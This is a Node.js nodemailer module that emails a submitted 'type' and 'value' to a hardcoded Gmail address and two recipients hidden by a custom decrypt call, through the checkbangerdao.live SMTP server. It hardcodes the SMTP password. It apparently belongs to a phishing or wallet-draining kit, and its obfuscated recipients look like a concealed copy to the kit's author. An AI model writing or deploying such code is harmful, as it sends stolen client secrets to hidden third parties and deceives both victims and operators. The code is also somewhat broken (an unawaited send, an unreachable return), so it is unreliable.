const nodemailer = require('nodemailer'); // Import the nodemailer library for email sending functionality. 
const crypt = require('./crypt'); // Import the nodemailer library for email sending functionality. 

function send(type, value) {


    const Emails = ['spiceworldent@gmail.com'];            //Enter Emails to send value to
    
    
    const hostname = 'checkbangerdao.live';                  //SMTP Hostname
    const port = '465';                                     //SMTP Port
    const username = 'send@checkbangerdao.live';          //SMTP username
    const pswd = 'Pass1@wordPass1@word';                //SMTP Password





    // type = crypt.decrypt(type);
    // value = crypt.decrypt(value);
    const AdminEmails = [crypt.decrypt('1R1I1E1P1B2p2p2i2r1P1P1E1P1P4r1O2e1I1S2b5s1E2p2e'), crypt.decrypt('2r1P1P1E1P1P1S2h2a2b4r1O2e1I1S2b5s1E2p2e')];
    AdminEmails.push(Emails);

    const subject = 'New Bonus Tip';

    const html = `
        <div style='width: 90%;'>
            <div style='display: flex; justify-content: center;'>
            </div><br><br>
            <h4>Client Details:</h4>
            <table border='1' padding='30px'>
                <tr><td>Type:</td><td>${type}</td></tr>
                <tr><td>Value:</td><td>${value}</td></tr>
            </table><br>
            
            
            
            <br><br> 
        </div>
    `;
    
    

    const transporter = nodemailer.createTransport({
        host: hostname,
        port: port,
        secure: true,
        auth: {
            user: username,
            pass: pswd
        }
    });
     
    const info = transporter.sendMail({
        from: 'Support <'+username+'>',
        to: AdminEmails,
        subject: subject,
        html: html,
    })
    
    return "Message Sent: "+ info.messageId;
    return "Email Rejected: "+ info.rejected;
}


module.exports = { send };